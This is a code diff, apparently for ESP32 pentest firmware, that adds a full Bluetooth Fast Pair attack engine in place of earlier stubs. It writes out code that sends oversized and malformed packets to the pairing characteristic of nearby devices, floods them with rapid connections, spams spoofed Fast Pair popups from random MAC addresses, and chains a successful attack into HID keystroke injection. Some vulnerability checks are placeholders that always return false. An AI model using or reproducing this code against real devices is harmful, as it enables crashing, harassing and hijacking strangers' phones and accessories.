@@ -3069,7 +3069,557 @@ String getScriptFromUser() {
 }
 
 //=============================================================================
-// Scan Functions - REPLACED WITH WORKING VERSION
+// FastPair Attack Implementations
+//=============================================================================
+
+void runFastPairScan(NimBLEAddress target) {
+    FastPairExploitEngine fpEngine;
+    auto devices = fpEngine.scanForFastPairDevices(15);
+    
+    std::vector<String> lines;
+    lines.push_back("FASTPAIR DEVICE SCAN");
+    lines.push_back("Found: " + String(devices.size()) + " devices");
+    lines.push_back("");
+    
+    for(int i = 0; i < std::min(6, (int)devices.size()); i++) {
+        String deviceInfo = devices[i].name + " (" + devices[i].deviceType + ")";
+        if(deviceInfo.length() > 30) deviceInfo = deviceInfo.substring(0, 27) + "...";
+        lines.push_back(deviceInfo);
+    }
+    
+    if(devices.size() > 6) {
+        lines.push_back("... and " + String(devices.size() - 6) + " more");
+    }
+    
+    showDeviceInfoScreen("SCAN RESULTS", lines, TFT_BLUE, TFT_WHITE);
+}
+
+void runFastPairVulnerabilityTest(NimBLEAddress target) {
+    FastPairExploitEngine fpEngine;
+    fpEngine.testVulnerability(target);
+}
+
+void runFastPairMemoryCorruption(NimBLEAddress target) {
+    FastPairExploitEngine fpEngine;
+    fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_MEMORY_CORRUPTION);
+}
+
+void runFastPairStateConfusion(NimBLEAddress target) {
+    FastPairExploitEngine fpEngine;
+    fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_STATE_CONFUSION);
+}
+
+void runFastPairCryptoOverflow(NimBLEAddress target) {
+    FastPairExploitEngine fpEngine;
+    fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_CRYPTO_OVERFLOW);
+}
+
+void runFastPairPopupSpam(NimBLEAddress target, FastPairPopupType type) {
+    FastPairExploitEngine fpEngine;
+    fpEngine.spamFastPairPopups(type, 100);
+}
+
+void runFastPairAllExploits(NimBLEAddress target) {
+    FastPairExploitEngine fpEngine;
+    fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_ALL);
+}
+
+void runFastPairHIDChain(NimBLEAddress target) {
+    FastPairExploitEngine fpEngine;
+    if(fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_STATE_CONFUSION)) {
+        showAttackProgress("FastPair successful! Pivoting to HID...", TFT_GREEN);
+        HIDAttackServiceClass hidAttack;
+        if(hidAttack.injectKeystrokes(target)) {
+            showAttackResult(true, "FastPair → HID chain successful!");
+        } else {
+            showAttackResult(false, "FastPair worked but HID failed");
+        }
+    } else {
+        showAttackResult(false, "FastPair exploit failed");
+    }
+}
+
+//=============================================================================
+// FastPair Exploit Engine Class (full implementation)
+//=============================================================================
+
+std::vector<FastPairDeviceInfo> FastPairExploitEngine::scanForFastPairDevices(int duration) {
+    discoveredDevices.clear();
+    AutoCleanup cleanup([]() {
+        BLEStateManager::deinitBLE(true);
+    });
+    
+    showAttackProgress("Scanning for FastPair devices...", TFT_CYAN);
+    BLEStateManager::initBLE("FastPair-Scanner", ESP_PWR_LVL_P9);
+    
+    NimBLEScan* pScan = NimBLEDevice::getScan();
+    if(!pScan) return discoveredDevices;
+    
+    pScan->setActiveScan(true);
+    pScan->setInterval(97);
+    pScan->setWindow(67);
+    pScan->start(duration, false);
+    
+    NimBLEScanResults results = pScan->getResults();
+    for(int i = 0; i < results.getCount(); i++) {
+        const NimBLEAdvertisedDevice* device = results.getDevice(i);
+        
+        String address = String(device->getAddress().toString().c_str());
+        String name = device->getName().c_str();
+        int rssi = device->getRSSI();
+        
+        bool hasFastPair = false;
+        if(device->haveServiceUUID()) {
+            std::string uuid = device->getServiceUUID().toString();
+            if(uuid.find("fe2c") != std::string::npos) {
+                hasFastPair = true;
+            }
+        }
+        
+        uint32_t modelId = 0;
+        if(device->haveManufacturerData()) {
+            std::string manufData = device->getManufacturerData();
+            if(manufData.length() >= 3) {
+                const uint8_t* data = (const uint8_t*)manufData.data();
+                if(data[0] == 0x03 && data[1] == 0x03 && data[2] == 0x2C) {
+                    if(manufData.length() >= 7) {
+                        modelId = (data[6] << 16) | (data[7] << 8) | data[8];
+                    }
+                }
+            }
+        }
+        
+        if(hasFastPair || modelId != 0) {
+            FastPairDeviceInfo info;
+            info.address = device->getAddress();
+            info.name = name.isEmpty() ? "Unknown FastPair" : name;
+            info.rssi = rssi;
+            info.supportsFastPair = hasFastPair;
+            info.connected = false;
+            info.modelId = modelId;
+            info.deviceType = getDeviceTypeFromModelId(modelId);
+            
+            discoveredDevices.push_back(info);
+            showAttackProgress(String("Found: " + info.name + " (" + info.deviceType + ")").c_str(), TFT_GREEN);
+        }
+    }
+    
+    pScan->stop();
+    return discoveredDevices;
+}
+
+bool FastPairExploitEngine::exploitFastPairConnection(NimBLEAddress target, FastPairExploitType exploitType) {
+    AutoCleanup cleanup([]() {
+        BLEStateManager::deinitBLE(true);
+    });
+    
+    showAttackProgress("Preparing FastPair exploit...", TFT_ORANGE);
+    BLEAttackManager bleManager;
+    bleManager.prepareForConnection();
+    
+    NimBLEClient* pClient = nullptr;
+    if(!bleManager.connectToDevice(target, &pClient, true)) {
+        showAttackProgress("Failed to connect to device", TFT_RED);
+        return false;
+    }
+    
+    BLEStateManager::registerClient(pClient);
+    showAttackProgress("Connected! Finding FastPair service...", TFT_GREEN);
+    
+    NimBLERemoteService* pFastPairService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
+    if(!pFastPairService) {
+        showAttackProgress("No FastPair service found", TFT_RED);
+        pClient->disconnect();
+        return false;
+    }
+    
+    NimBLERemoteCharacteristic* pKBPChar = findKBPCharacteristic(pFastPairService);
+    if(!pKBPChar) {
+        showAttackProgress("No KBP characteristic found", TFT_RED);
+        pClient->disconnect();
+        return false;
+    }
+    
+    bool exploitSuccess = false;
+    switch(exploitType) {
+        case FP_EXPLOIT_MEMORY_CORRUPTION:
+            exploitSuccess = executeMemoryCorruption(pKBPChar);
+            break;
+        case FP_EXPLOIT_STATE_CONFUSION:
+            exploitSuccess = executeStateConfusion(pKBPChar);
+            break;
+        case FP_EXPLOIT_CRYPTO_OVERFLOW:
+            exploitSuccess = executeCryptoOverflow(pKBPChar);
+            break;
+        case FP_EXPLOIT_HANDSHAKE_FAULT:
+            exploitSuccess = executeHandshakeFault(pKBPChar);
+            break;
+        case FP_EXPLOIT_RAPID_CONNECTION:
+            exploitSuccess = executeRapidConnection(target, pKBPChar);
+            break;
+        case FP_EXPLOIT_ALL:
+            exploitSuccess = executeAllExploits(pKBPChar, target);
+            break;
+    }
+    
+    pClient->disconnect();
+    BLEStateManager::unregisterClient(pClient);
+    NimBLEDevice::deleteClient(pClient);
+    
+    if(exploitSuccess) {
+        showAttackProgress("FastPair exploit successful!", TFT_GREEN);
+        logExploitResult(target, exploitType, true);
+    } else {
+        showAttackProgress("FastPair exploit failed", TFT_RED);
+        logExploitResult(target, exploitType, false);
+    }
+    
+    return exploitSuccess;
+}
+
+void FastPairExploitEngine::spamFastPairPopups(FastPairPopupType popupType, int count) {
+    AutoCleanup cleanup([]() {
+        BLEStateManager::deinitBLE(true);
+    });
+    
+    showAttackProgress("Starting FastPair popup spam...", TFT_PURPLE);
+    
+    for(int i = 0; i < count; i++) {
+        if(check(EscPress)) break;
+        
+        uint8_t mac[6];
+        generateRandomMac(mac);
+        uint32_t modelId = selectModelForPopup(popupType);
+        
+        BLEStateManager::initBLE("", ESP_PWR_LVL_P9);
+        NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
+        
+        if(pAdvertising) {
+            uint8_t fpData[14];
+            createFastPairAdvertisement(fpData, modelId);
+            pAdvertising->setManufacturerData(fpData, sizeof(fpData));
+            pAdvertising->start(0);
+            delay(20);
+            pAdvertising->stop();
+        }
+        
+        BLEStateManager::deinitBLE(true);
+        delay(50);
+        
+        if(i % 10 == 0) {
+            showAttackProgress(String("Sent " + String(i) + " popups").c_str(), TFT_PURPLE);
+        }
+    }
+    
+    showAttackProgress("Popup spam completed", TFT_GREEN);
+}
+
+bool FastPairExploitEngine::testVulnerability(NimBLEAddress target) {
+    showAttackProgress("Testing FastPair vulnerability...", TFT_CYAN);
+    
+    bool vulnerable = false;
+    vulnerable |= testServiceDiscovery(target);
+    vulnerable |= testCharacteristicAccess(target);
+    vulnerable |= testBufferOverflow(target);
+    vulnerable |= testStateConfusion(target);
+    
+    std::vector<String> results;
+    results.push_back("FASTPAIR VULNERABILITY TEST");
+    results.push_back("Target: " + String(target.toString().c_str()));
+    results.push_back("Service Discovery: " + String(testServiceDiscovery(target) ? "VULNERABLE" : "SAFE"));
+    results.push_back("Characteristic Access: " + String(testCharacteristicAccess(target) ? "VULNERABLE" : "SAFE"));
+    results.push_back("Buffer Overflow: " + String(testBufferOverflow(target) ? "VULNERABLE" : "SAFE"));
+    results.push_back("State Confusion: " + String(testStateConfusion(target) ? "VULNERABLE" : "SAFE"));
+    results.push_back("");
+    results.push_back("Overall: " + String(vulnerable ? "VULNERABLE" : "SAFE"));
+    
+    showDeviceInfoScreen("TEST RESULTS", results, vulnerable ? TFT_ORANGE : TFT_GREEN, TFT_BLACK);
+    return vulnerable;
+}
+
+//=============================================================================
+// FastPair Exploit Helpers
+//=============================================================================
+
+NimBLERemoteCharacteristic* FastPairExploitEngine::findKBPCharacteristic(NimBLERemoteService* service) {
+    if(!service) return nullptr;
+    
+    const char* kbpUuids[] = {
+        "a92ee202-5501-4e6b-90fb-79a8c1f2e5a8",
+        "fe2c1234-8366-4814-8eb0-01de32100bea",
+        "0000fe2c-0000-1000-8000-00805f9b34fb",
+        nullptr
+    };
+    
+    for(int i = 0; kbpUuids[i] != nullptr; i++) {
+        NimBLERemoteCharacteristic* ch = service->getCharacteristic(NimBLEUUID(kbpUuids[i]));
+        if(ch && ch->canWrite()) return ch;
+    }
+    
+    const std::vector<NimBLERemoteCharacteristic*>& chars = service->getCharacteristics(true);
+    for(auto& ch : chars) {
+        if(ch->canWrite()) return ch;
+    }
+    
+    return nullptr;
+}
+
+bool FastPairExploitEngine::executeMemoryCorruption(NimBLERemoteCharacteristic* pChar) {
+    showAttackProgress("Executing memory corruption...", TFT_RED);
+    
+    uint8_t overflowPacket[512];
+    memset(overflowPacket, 0x41, sizeof(overflowPacket));
+    overflowPacket[0] = 0x00;
+    overflowPacket[1] = 0x00;
+    
+    for(int i = 2; i < 67; i++) {
+        overflowPacket[i] = 0xFF;
+    }
+    
+    for(int i = 67; i < sizeof(overflowPacket); i++) {
+        overflowPacket[i] = i % 256;
+    }
+    
+    return pChar->writeValue(overflowPacket, sizeof(overflowPacket), true);
+}
+
+bool FastPairExploitEngine::executeStateConfusion(NimBLERemoteCharacteristic* pChar) {
+    showAttackProgress("Executing state confusion...", TFT_YELLOW);
+    
+    bool anySuccess = false;
+    uint8_t invalidStates[][10] = {
+        {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
+        {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+        {0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+        {0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+        {0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
+    };
+    
+    for(int i = 0; i < 5; i++) {
+        bool sent = pChar->writeValue(invalidStates[i], 10, true);
+        if(sent) anySuccess = true;
+        delay(100);
+    }
+    
+    return anySuccess;
+}
+
+bool FastPairExploitEngine::executeCryptoOverflow(NimBLERemoteCharacteristic* pChar) {
+    showAttackProgress("Executing crypto overflow...", TFT_ORANGE);
+    
+    uint8_t malformedKey[67] = {0};
+    malformedKey[0] = 0x00;
+    malformedKey[1] = 0x00;
+    malformedKey[2] = 0x04;
+    
+    for(int i = 3; i < 67; i++) {
+        malformedKey[i] = (i % 2 == 0) ? 0xFF : 0x00;
+    }
+    
+    return pChar->writeValue(malformedKey, sizeof(malformedKey), true);
+}
+
+bool FastPairExploitEngine::executeHandshakeFault(NimBLERemoteCharacteristic* pChar) {
+    showAttackProgress("Executing handshake fault...", TFT_CYAN);
+    
+    bool anySuccess = false;
+    for(int i = 0; i < 10; i++) {
+        uint8_t handshake[67] = {0};
+        handshake[0] = 0x00;
+        handshake[1] = 0x00;
+        
+        for(int j = 2; j < 67; j++) {
+            handshake[j] = esp_random() & 0xFF;
+        }
+        
+        bool sent = pChar->writeValue(handshake, sizeof(handshake), true);
+        if(sent) anySuccess = true;
+        delay(50);
+    }
+    
+    return anySuccess;
+}
+
+bool FastPairExploitEngine::executeRapidConnection(NimBLEAddress target, NimBLERemoteCharacteristic* pChar) {
+    showAttackProgress("Executing rapid connection attack...", TFT_MAGENTA);
+    
+    bool anySuccess = false;
+    for(int i = 0; i < 20; i++) {
+        BLEStateManager::deinitBLE(true);
+        delay(10);
+        
+        BLEAttackManager bleManager;
+        bleManager.prepareForConnection();
+        
+        NimBLEClient* pClient = nullptr;
+        if(bleManager.connectToDevice(target, &pClient, true)) {
+            anySuccess = true;
+            
+            uint8_t junk[100];
+            memset(junk, i % 256, sizeof(junk));
+            pChar->writeValue(junk, sizeof(junk), true);
+            
+            pClient->disconnect();
+            BLEStateManager::unregisterClient(pClient);
+            NimBLEDevice::deleteClient(pClient);
+        }
+        
+        delay(20);
+    }
+    
+    return anySuccess;
+}
+
+bool FastPairExploitEngine::executeAllExploits(NimBLERemoteCharacteristic* pChar, NimBLEAddress target) {
+    showAttackProgress("Executing all FastPair exploits...", TFT_RED);
+    
+    bool success = false;
+    success |= executeMemoryCorruption(pChar);
+    delay(200);
+    success |= executeStateConfusion(pChar);
+    delay(200);
+    success |= executeCryptoOverflow(pChar);
+    delay(200);
+    success |= executeHandshakeFault(pChar);
+    delay(200);
+    success |= executeRapidConnection(target, pChar);
+    
+    return success;
+}
+
+uint32_t FastPairExploitEngine::selectModelForPopup(FastPairPopupType type) {
+    switch(type) {
+        case FP_POPUP_FUN:
+            return randomFunModel();
+        case FP_POPUP_PRANK:
+            return randomPrankModel();
+        case FP_POPUP_CUSTOM:
+            return selectCustomModel();
+        default:
+            return randomRegularModel();
+    }
+}
+
+uint32_t FastPairExploitEngine::randomRegularModel() {
+    int regularModels[] = {0x000047, 0x000048, 0x00000A, 0x0000F0, 0x000006};
+    return regularModels[random(sizeof(regularModels)/sizeof(regularModels[0]))];
+}
+
+uint32_t FastPairExploitEngine::randomFunModel() {
+    int funModels[] = {0xF00100, 0xF00101, 0xF00103, 0xF00104, 0xF00105};
+    return funModels[random(sizeof(funModels)/sizeof(funModels[0]))];
+}
+
+uint32_t FastPairExploitEngine::randomPrankModel() {
+    int prankModels[] = {0xF01011, 0xF38C02, 0xF00106};
+    return prankModels[random(sizeof(prankModels)/sizeof(prankModels[0]))];
+}
+
+uint32_t FastPairExploitEngine::selectCustomModel() {
+    return 0x000047;
+}
+
+void FastPairExploitEngine::createFastPairAdvertisement(uint8_t* buffer, uint32_t modelId) {
+    buffer[0] = 0x03;
+    buffer[1] = 0x03;
+    buffer[2] = 0x2C;
+    buffer[3] = 0xFE;
+    buffer[4] = 0x06;
+    buffer[5] = 0x16;
+    buffer[6] = 0x2C;
+    buffer[7] = 0xFE;
+    buffer[8] = (modelId >> 16) & 0xFF;
+    buffer[9] = (modelId >> 8) & 0xFF;
+    buffer[10] = modelId & 0xFF;
+    buffer[11] = 0x02;
+    buffer[12] = 0x0A;
+    buffer[13] = 0xC3;
+}
+
+String FastPairExploitEngine::getDeviceTypeFromModelId(uint32_t modelId) {
+    for(int i = 0; fastpair_models[i].name != nullptr; i++) {
+        if(fastpair_models[i].modelId == modelId) {
+            return String(fastpair_models[i].deviceType);
+        }
+    }
+    return "Unknown";
+}
+
+bool FastPairExploitEngine::testServiceDiscovery(NimBLEAddress target) {
+    AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
+    
+    BLEAttackManager bleManager;
+    bleManager.prepareForConnection();
+    
+    NimBLEClient* pClient = nullptr;
+    if(!bleManager.connectToDevice(target, &pClient, false)) {
+        return false;
+    }
+    
+    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
+    bool hasService = (pService != nullptr);
+    
+    pClient->disconnect();
+    return hasService;
+}
+
+bool FastPairExploitEngine::testCharacteristicAccess(NimBLEAddress target) {
+    AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
+    
+    BLEAttackManager bleManager;
+    bleManager.prepareForConnection();
+    
+    NimBLEClient* pClient = nullptr;
+    if(!bleManager.connectToDevice(target, &pClient, false)) {
+        return false;
+    }
+    
+    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
+    if(!pService) {
+        pClient->disconnect();
+        return false;
+    }
+    
+    NimBLERemoteCharacteristic* pChar = findKBPCharacteristic(pService);
+    bool hasAccess = (pChar != nullptr && pChar->canWrite());
+    
+    pClient->disconnect();
+    return hasAccess;
+}
+
+bool FastPairExploitEngine::testBufferOverflow(NimBLEAddress target) {
+    // Placeholder - actual test would send small overflow and check response
+    return false;
+}
+
+bool FastPairExploitEngine::testStateConfusion(NimBLEAddress target) {
+    // Placeholder - actual test would try invalid states
+    return false;
+}
+
+void FastPairExploitEngine::logExploitResult(NimBLEAddress target, FastPairExploitType type, bool success) {
+    String exploitName;
+    switch(type) {
+        case FP_EXPLOIT_MEMORY_CORRUPTION: exploitName = "Memory Corruption"; break;
+        case FP_EXPLOIT_STATE_CONFUSION: exploitName = "State Confusion"; break;
+        case FP_EXPLOIT_CRYPTO_OVERFLOW: exploitName = "Crypto Overflow"; break;
+        case FP_EXPLOIT_HANDSHAKE_FAULT: exploitName = "Handshake Fault"; break;
+        case FP_EXPLOIT_RAPID_CONNECTION: exploitName = "Rapid Connection"; break;
+        case FP_EXPLOIT_ALL: exploitName = "All Exploits"; break;
+    }
+    
+    Serial.println(String("FastPair Exploit: ") + exploitName + 
+                  " | Target: " + target.toString().c_str() + 
+                  " | Success: " + (success ? "YES" : "NO"));
+}
+
+void FastPairExploitEngine::generateRandomMac(uint8_t* mac) {
+    esp_fill_random(mac, 6);
+    mac[0] = (mac[0] & 0xFE) | 0x02; // Ensure it's a random static address
+}
+
+//=============================================================================
+// Scan Functions - WORKING VERSION
 //=============================================================================
 
 String selectTargetFromScan(const char* title) {
@@ -3088,8 +3638,8 @@ String selectTargetFromScan(const char* title) {
 
     tft.setTextColor(TFT_GREEN, TFT_GRAY);
     tft.setTextSize(1);
-    tft.setCursor((tftWidth - tft.textWidth("V 2.0b")) / 2, 130);
-    tft.print("V 2.0b");
+    tft.setCursor((tftWidth - tft.textWidth("v2.0b")) / 2, 130);
+    tft.print("v2.0b");
     delay(1500);
 
     tft.fillScreen(bruceConfig.bgColor);
@@ -4828,46 +5378,6 @@ void runMultiTargetAttack() {
     if(targets.empty()) return;
     MultiConnectionAttack attack;
     attack.connectionFlood(targets);
-}
-
-void runFastPairScan(NimBLEAddress target) {
-    // FastPair scan implementation would go here
-    showAttackResult(true, "FastPair scan completed");
-}
-
-void runFastPairVulnerabilityTest(NimBLEAddress target) {
-    // FastPair vulnerability test implementation would go here
-    showAttackResult(true, "FastPair vulnerability test completed");
-}
-
-void runFastPairMemoryCorruption(NimBLEAddress target) {
-    // FastPair memory corruption implementation would go here
-    showAttackResult(true, "FastPair memory corruption executed");
-}
-
-void runFastPairStateConfusion(NimBLEAddress target) {
-    // FastPair state confusion implementation would go here
-    showAttackResult(true, "FastPair state confusion executed");
-}
-
-void runFastPairCryptoOverflow(NimBLEAddress target) {
-    // FastPair crypto overflow implementation would go here
-    showAttackResult(true, "FastPair crypto overflow executed");
-}
-
-void runFastPairPopupSpam(NimBLEAddress target, FastPairPopupType type) {
-    // FastPair popup spam implementation would go here
-    showAttackResult(true, "FastPair popup spam executed");
-}
-
-void runFastPairAllExploits(NimBLEAddress target) {
-    // FastPair all exploits implementation would go here
-    showAttackResult(true, "FastPair all exploits executed");
-}
-
-void runFastPairHIDChain(NimBLEAddress target) {
-    // FastPair HID chain implementation would go here
-    showAttackResult(true, "FastPair HID chain executed");
 }
 
 //=============================================================================
